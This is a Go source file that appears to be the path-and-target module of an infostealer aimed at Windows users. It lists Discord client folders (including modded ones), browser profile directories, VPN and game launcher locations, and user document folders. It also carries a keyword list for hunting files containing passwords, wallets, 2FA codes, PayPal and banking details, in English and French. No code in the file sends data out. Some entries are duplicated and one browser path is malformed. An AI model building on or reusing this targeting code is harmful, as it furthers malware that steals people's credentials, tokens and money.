package scripts

import (
	"fmt"
	"os/user"
	"strings"
)

func GetConfig() (string, string) {
	return "", ""
}

func GetAppdataPath() string {

	userN, _ := user.Current()
	username := userN.Username

	parts := strings.Split(username, "\\")

	if len(parts) > 1 {
		username = parts[1]
	}

	path := fmt.Sprintf("C:\\Users\\%s\\AppData\\", username)

	return path

}

func GetTempPath() string {
	return "C:\\Windows\\Temp"
}

func GetRoamingPath() string {

	userN, _ := user.Current()
	username := userN.Username

	parts := strings.Split(username, "\\")

	if len(parts) > 1 {
		username = parts[1]
	}

	path := fmt.Sprintf("C:\\Users\\%s\\AppData\\Roaming\\", username)

	return path

}

func GetVpnPath() []string {

	paths := []string{
		"C:\\Program Files\\NordVPN",
		"C:\\Program Files\\Mullvad VPN",
		"C:\\Program Files\\Proton\\VPN",
	}

	return paths

}

func GetGamingPath() []string {

	paths := []string{
		"C:\\Program Files\\Epic Games",
		"C:\\Riot Games",
	}

	return paths

}

func GetDiscordPath() []string {

	roaming := GetRoamingPath()

	paths := []string{
		roaming + "discord",
		roaming + "discordcanary",
		roaming + "discordptb",
		roaming + "lightcord",
		roaming + "discorddevelopment",
		roaming + "discordstable",
	}

	return paths
}

func GetBrowsersPath() []string {

	appdata := GetAppdataPath()

	paths := []string{
		appdata + "Local\\BraveSoftware\\Brave-Browser\\User Data\\Default",
		appdata + "Local\\Google\\Chrome\\User Data\\Default",
		appdata + "Local\\Microsoft\\Edge\\User Data\\\\Default\"",
		appdata + "Local\\Google\\Chrome\\User Data\\Default",
		appdata + "Local\\Google\\Chrome\\User Data\\Default",
	}
	return paths

}

func WindowsPath() []string {

	path := []string{
		"Downloads",
		"Documents",
		"Desktop",
	}
	return path

}

func KeywordsFile() []string {

	keywords := []string{
		"password",
		"backup",
		"mdp",
		"motdepasse",
		"login",
		"secret",
		"paypal",
		"banque",
		"wallet",
		"discord",
		"2fa",
		"code",
		"secret",
		"key",
		"identifiant",
		"key",
	}

	return keywords

}
